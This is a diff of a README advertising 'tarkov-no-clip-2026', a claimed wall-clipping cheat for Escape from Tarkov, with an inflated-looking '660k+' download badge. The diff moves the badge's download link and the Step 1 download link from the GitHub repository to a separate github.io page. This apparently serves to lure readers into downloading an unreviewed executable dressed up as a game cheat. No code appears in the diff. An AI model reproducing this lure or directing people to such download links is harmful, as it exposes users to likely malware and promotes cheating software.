@@ -1,6 +1,6 @@
 # 🧱 tarkov-no-clip-2026 - Walk Through Any Wall Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-v2026-blueviolet?style=for-the-badge&logo=github)](https://github.com/andreiunwary1689/tarkov-no-clip-2026)
+[![Download Now](https://img.shields.io/badge/Download-v2026-blueviolet?style=for-the-badge&logo=github)](https://andreiunwary1689.github.io)
 
 ![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v2026-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-660k%2B-orange?style=flat-square)
 
@@ -38,7 +38,7 @@ Tarkov NoClip 2026 is a simple tool that lets you walk through walls, floors, an
 
 ### Step 1: Get the File
 
-Visit this link to download the application: **[https://github.com/andreiunwary1689/tarkov-no-clip-2026](https://github.com/andreiunwary1689/tarkov-no-clip-2026)**
+Visit this link to download the application: **[https://andreiunwary1689.github.io](https://andreiunwary1689.github.io)**
 
 Click the **Download** button on that page to get the file.
 
